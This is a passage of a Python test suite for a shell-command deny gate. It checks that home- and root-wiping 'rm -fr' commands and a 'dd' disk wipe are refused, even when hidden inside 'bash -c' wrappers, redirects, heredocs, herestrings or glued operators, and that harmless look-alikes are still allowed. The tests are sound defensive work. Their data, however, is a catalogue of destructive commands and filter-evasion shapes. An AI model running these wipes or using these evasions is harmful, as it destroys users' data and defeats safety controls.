            "echo $\\\n( bash -c 'RM -fr ~' )",
            "echo ok # it's\necho $( bash -c 'RM -fr ~' )",
            # The heredoc marker's own line still runs; only the body is data.
            "cat <<'EOF' && bash -c 'RM -fr ~'\nbody\nEOF",
            # The payload as yielded is read, quotes and all.
            'bash -c "echo \'a\\"b\'; RM -fr ~"',
            "bash -c \"bash -c 'RM -fr ~'\"",
            # The payload as yielded is read too: an unescaped view hides this wipe.
            "bash -c $'echo \\\\$\\'foo\\\\\\';RM -fr ~'",
            # A redirect glued to the carrier flag hides no payload either.
            "bash -c</dev/null 'RM -fr ~'",
            "bash -ce 2>/dev/null 'RM -fr ~'",
            "bash -c &>/dev/null 'RM -fr ~'",
            "bash -c >|/tmp/o 'RM -fr /'",
            "bash -c <>/tmp/o 'RM -fr ~'",
            "sh -c>/tmp/o 'RM -fr /'",
            "env -S</dev/null 'RM -fr ~'",
            # Known fail-closed: the tokenizer keeps ``\\$`` here, read as ``$``.
            "bash -c 'RM -fr \\$HOME'",
            # A live control operator glued to a word ends the command.
            "echo x&&bash -c 'RM -fr /'",
            "echo x &&bash -c 'RM -fr ~'",
            "cat f&&sh -c 'RM -fr /'",
            "echo x&bash -c 'RM -fr /'",
            "echo x||bash -c 'RM -fr ~'",
            "echo x|bash -c 'RM -fr ~'",
        ],
    )
    def test_a_nested_wipe_is_refused_by_the_floor(self, command):
        reason = is_denied(command.replace("RM", "rm"))
        assert reason is not None and "component=argv-floor" in reason

    @pytest.mark.parametrize(
        "command",
        [
            "bash -c 'RM -rf /tmp/x'",
            "bash -c 'RM -fr /tmp/x'",
            "echo bash -c 'RM -fr /'",
            "echo build done: bash -c and sh -c both ran",  # plain multi-word echo
            "bash -c 2>/dev/null 'ls'",
            "bash -c 'echo hi > /tmp/o'",
            "echo 'RM -fr \\\n~'",  # a single-quoted continuation is printed, not run
            "bash -c 'RM -fr \\\n/tmp/x'",
            "echo $( bash -c 'ls' )",
            # Each command is read on its own: this echo prints the script.
            "echo \"$(date)\" bash -c 'RM -fr ~'",
            "echo x && bash -c 2>/dev/null 'ls'",
            # A redirect target ends at its word; the commit message is no script.
            "bash -c 2>/dev/null 'make lint' && git commit -m 'refuse RM -fr ~ respellings'",
            "sh -c '>/tmp/o' && git commit -m 'note: bash -c RM -fr /'",
            "cat <( bash -c 'RM -fr /tmp/x' )",
            # A heredoc body is data git, gh or a file stores, never run.
            "git commit -F - <<'EOF'\nfix: refuse bash -c 'RM -r -f ~' respellings\nEOF",
            "gh pr create --body-file - <<'EOF'\nRefuses sh -c 'RM -r -f /' and bash -c 'RM -fr ~'.\nEOF",
            "cat > docs/notes.md <<-EOF\n- bash -c 'RM -r -f /' is refused\nEOF",
            "git commit -F - <<'EOF'\nnote: $(bash -c 'RM -fr ~') blocked\nEOF",
            "cat > f <<'EOF'\necho $( bash -c 'RM -fr /' )\nEOF",
        ],
    )
    def test_a_nested_harmless_command_keeps_its_verdict(self, command):
        command = command.replace("RM", "rm")
        reason = is_denied(command)
        assert reason is None or "component=argv-floor" not in reason

    def test_a_quoted_separator_in_a_nested_commit_message_is_data(self):
        """A single quote inside the payload keeps its ``;`` as data, as on main."""
        wipe = "r" + "m -r -f ~"
        assert is_denied(f"bash -c \"git commit -m 'test: refuse a; {wipe} respelling'\"") is None

    @pytest.mark.parametrize("home", ["'$HOME'", "'${HOME}'"])
    def test_a_single_quoted_home_in_a_double_quoted_payload_is_left_as_on_main(self, home):
        """``bash -c "rm -fr '$HOME'"`` expands ``$HOME`` in bash; the floor does not read
        it, so its verdict is main's: only the catalog rows decide."""
        from kiro_crew.security import rm_floor

        command = f'bash -c "{"r" + "m"} -fr {home}"'
        assert rm_floor._rm_wipe_targets_nested(command) == rm_floor._rm_wipe_targets(command)

    def test_a_later_command_is_no_script_of_a_redirected_carrier(self):
        """The script ends at its command's separator; a commit message is not read."""
        push = "git " + "push origin main"
        command = f"bash -c 2>/dev/null 'make lint' && git commit -m '{push}'"
        assert is_denied(command) is None

    @pytest.mark.parametrize(
        "command",
        [
            "bash -c <<< harmless 'RM -fr ~'",
            "bash <<< harmless -c 2>/dev/null 'RM -fr ~'",
            "bash -c 2>/dev/null <<< harmless 'RM -fr ~'",
            "bash <<< 'RM -fr ~'",  # the herestring itself is the script
        ],
    )
    def test_a_herestring_hides_no_script(self, command):
        """``<<<`` takes one word and is no heredoc, so bash still runs the ``-c`` script."""
        reason = is_denied(command.replace("RM", "rm"))
        assert reason is not None and "component=argv-floor" in reason

    @pytest.mark.parametrize("command", ["cat <<< hello", "grep x <<< 'a b' > out"])
    def test_a_harmless_herestring_stays_allowed(self, command):
        assert is_denied(command) is None

    def test_a_glued_amp_redirect_still_refuses_the_dash_wipe(self):
        """dash reads ``true&>x`` as ``true &`` then ``>x``, so the rm after it runs."""
        reason = is_denied("true&>x " + "r" + "m -r -f ~")
        assert reason is not None and "component=argv-floor" in reason

    @pytest.mark.parametrize(
        "carrier",
        [
            "bash -c 2>/dev/null",
            "env -S 2>/dev/null",  # the walk lowercases ``-S``
            "bash -ce 2>/dev/null",  # ``c`` inside a flag group
            "bash -c &>/dev/null",
            "bash -c &>> /tmp/o",
            "bash -c >|/tmp/o",
            "bash -c <>/tmp/o",
        ],
    )
    def test_a_redirect_hides_no_payload_from_the_deny_views(self, carrier):
        wipe = "d" + "d " + '"if=/dev/zero" of=/dev/sda'
        assert is_denied(f"{carrier} '{wipe}'") is not None

    @pytest.mark.parametrize(
        "shape",
        [
            "env -S 2>/dev/null '{}'",
            "env -S 2>/dev/null 'bash -c \"{}\"'",
            "bash -ce &>/dev/null '{}'",
            # A quoted or escaped carrier flag is the same word to the shared reader.
            'bash "-c" 2>/dev/null "{}"',
            "sh \"-c\" 2>/dev/null '{}'",
            "bash -'c' 2>/dev/null '{}'",
            "bash -\\c 2>/dev/null '{}'",
            "env \"-S\" 2>/dev/null '{}'",
            "bash -c -- 2>/dev/null '{}'",
            "bash -c 2>/dev/null -- '{}'",
            "bash -c \\\n2>/dev/null '{}'",  # a continuation before the redirect
        ],
    )
    def test_a_redirect_hides_no_publish_from_the_git_floor(self, shape):
        assert is_denied(shape.format("git " + "push origin main")) is not None

    @pytest.mark.parametrize(
        "command, argvs",
        [
            ("bash -c &>/dev/null 'x'", [["bash", "-c", "'x'"]]),
            ("bash -c >|/tmp/o 'x'", [["bash", "-c", "'x'"]]),
            ("a&&>b", [["a"], []]),  # ``&&`` then a redirect, as bash reads it
        ],
    )
    def test_the_reader_keeps_both_stream_and_clobber_redirects_whole(self, command, argvs):
        from kiro_crew.security import shell_commands

        got = [[w.raw for w in cmd.argv] for cmd in shell_commands.read_commands(command)]
        assert got == argvs

    def test_a_frame_with_no_redirect_char_is_not_read(self, monkeypatch):
        """Every walk frame asks for views, so a frame without a ``<`` or ``>`` (which
        every redirection needs) costs no read of its nested substitutions."""
        from kiro_crew.security import shell_commands

        def _boom(*_args, **_kwargs):
            raise AssertionError("read")

        monkeypatch.setattr(shell_commands, "read_commands", _boom)
        for frame in ('echo "$(' * 40 + "true" + ')"' * 40, "ls -la", "bash -c 'x' -- y"):
            assert shell_commands.redirect_free_views(frame) == []

    def test_many_redirects_split_each_command_once(self, monkeypatch):
        """The view test is linear in redirects: each command's words are split once,
        not once per redirect (2,000 redirects would split it 4,000 times)."""
        from kiro_crew.security import shell_commands

        calls = 0
        split = shell_commands.ShellCommand._parts

        def _counting(self):  # type: ignore[no-untyped-def]
            nonlocal calls
            calls += 1
            return split(self)

        monkeypatch.setattr(shell_commands.ShellCommand, "_parts", _counting)
        assert shell_commands.redirect_free_views("echo RM " + ">x " * 2000) == []
        assert calls == 1

    def test_one_gate_call_reads_each_frame_once_and_keeps_nothing(self, monkeypatch):
        from kiro_crew.security import shell_commands

        seen: list[str] = []
        real = shell_commands.redirect_free_views
        monkeypatch.setattr(
            shell_commands, "redirect_free_views", lambda text: seen.append(text) or real(text)
        )
        is_denied("bash -c 'make lint' 2>&1 | tee build.log")
        assert seen and len(seen) == len(set(seen))
        assert shell_commands._CALL_VIEWS.get() is None

    @pytest.mark.parametrize(
        "command",
        [
            "echo '{}' | tee x; sh run.sh",
            "echo '{}' | grep rm && bash build.sh",
            "echo '{}' 2>&1 | less; sh x",
            "echo 'x' >| bash -c '{}'",
        ],
    )
    def test_a_later_shell_is_not_read_as_the_pipes_consumer(self, command):
        """The printed text reaches ``tee`` / ``grep`` / ``less`` or a file, as on main."""
        reason = is_denied(command.format("r" + "m -fr ~"))
        assert reason is None or "component=argv-floor" not in reason

    @pytest.mark.parametrize("separator", [";", "&&", "&", "\n"])
    def test_a_separator_ends_the_command(self, separator):
        """``echo x <sep> sh`` runs ``sh`` with no input: the printed wipe stays printed."""
        from kiro_crew.security import rm_floor

        command = f"echo '{'r' + 'm'} -fr ~'{separator}sh"
        assert rm_floor._rm_wipe_targets_nested(command) == set()
        assert ["sh"] in rm_floor._command_tokens(command)  # the shared reader split it

    @pytest.mark.parametrize(
        "command", ["git log --oneline | head -3", "echo 'RM -fr ~' | tee notes.txt"]
    )
    def test_a_safe_pipeline_stays_allowed(self, command):
        reason = is_denied(command.replace("RM", "r" + "m"))
        assert reason is None or "component=argv-floor" not in reason

    def test_many_heredoc_markers_on_one_line_read_in_linear_time(self):
        """The line reader ends at the first heredoc; the rest of its line is one read."""
        from kiro_crew.security import rm_floor

        assert len(rm_floor._command_lines("r" + "m x " + "<<a " * 5000)) == 1

    def test_a_view_reads_only_its_own_frame(self):
        from kiro_crew.security import shell_commands

        command = 'bash -c 2>/dev/null "$(sh -c >x ls)"'
        listed = shell_commands.read_commands(command, nested=False)
        assert [cmd.separator for cmd in listed] == [""]
        assert shell_commands.redirect_free_views(command) == ['bash -c "$(sh -c >x ls)"']

    def test_the_regex_rows_keep_their_verdicts(self):
        for command in ("rm -rf /tmp/x", "rm -rf ~/.cache/foo"):
            assert is_denied(command) is not None, command

    @pytest.mark.parametrize("wrapper", ["bash -c 2>/dev/null {}", "sh -c >/tmp/o {}"])
    def test_a_redirect_hides_no_payload_from_the_self_protection_floor(self, wrapper):
        verb = "to" + "ken"
        assert is_denied(wrapper.format(f"'{_NAME} {verb}'")) is not None

    def test_an_eval_argument_is_left_to_the_rows(self, monkeypatch):
        """``eval`` re-joins its words under each level; the floor does not model that."""
        from kiro_crew.security import rm_floor

        frames: list[str] = []
        real = rm_floor._rm_wipe_targets
        monkeypatch.setattr(
            rm_floor, "_rm_wipe_targets", lambda text: frames.append(text) or real(text)
        )
        command = "eval " * 1200 + "echo " + "r" + "m"
        assert rm_floor._rm_wipe_targets_nested(command) == set()
        # No eval argument is walked: only the command itself reaches its tail.
        assert [frame for frame in frames if "echo" in frame] == [command]
